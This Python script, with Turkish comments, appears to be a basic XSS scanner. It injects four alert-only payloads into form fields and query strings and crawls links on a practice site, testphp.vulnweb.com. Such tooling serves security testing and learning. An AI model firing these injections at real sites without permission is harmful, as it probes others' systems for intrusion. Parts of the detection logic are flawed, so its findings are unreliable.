import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

def get_all_forms(url):
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details
#form verileri doldurularak sunucuya yolla
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    #formdaki her giriş alanı üzerinde döngü 
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Tespit edilen form sayısı: {len(forms)}\n")

    for form in forms:
        form_details = get_form_details(form)
        print(f"[+] Form ayrıntıları: {form_details}")

        for payload in xss_payloads:
            response = submit_form(form_details, url, payload)

            if payload.encode() in response.content:
                print(f"\n[!!] XSS açığı bulundu! Payload: {payload}\n")

        for input in form_details["inputs"]:

            input_name = input["name"]
            input_value = input.get("value")
            if input_name:
                url_with_payload = urljoin(url, f"{urlparse(url).path}?{input_name}={payload}")

                response = requests.get(url_with_payload)

                if payload.encode() in response.content:
                    print(f"\n[!!] XSS açığı bulundu!  Payload: {payload}\n")

def scan_links(url):
    print("[+] Sayfaları tarama başladı...\n")
    visited_urls = set()
    internal_urls = set()

    def crawl(url):
        visited_urls.add(url)
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        for a_tag in soup.find_all("a"):
            href = a_tag.attrs.get("href")

            if href and not href.startswith("javascript:") and not href.startswith("#"):
                href = urljoin(url, href)
                parsed_href = urlparse(href)

                if parsed_href.netloc == parsed_url.netloc:
                    internal_urls.add(href)
                    if href not in visited_urls:
                        crawl(href)

    parsed_url = urlparse(url)
    crawl(url)

    print(f"[+] Tarama tamamlandı. Toplam link sayısı: {len(internal_urls)}\n")

    for link in internal_urls:
        response = requests.get(link)

        for payload in xss_payloads:
            if payload.encode() in response.content:
                print(f"\n[!!] XSS açığı bulundu! URL: {link}, Payload: {payload}\n")

# Test için kullanılacak hedef URL
target_url = 'http://testphp.vulnweb.com/login.php'

# XSS payload'ları
xss_payloads = [
    '<script>alert("XSS");</script>',
    '<img src="x" onerror="alert(\'XSS\');">',
    '<svg/onload=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>'
]

# XSS taraması yap
scan_xss(target_url)

# Link taraması yap
scan_links(target_url)
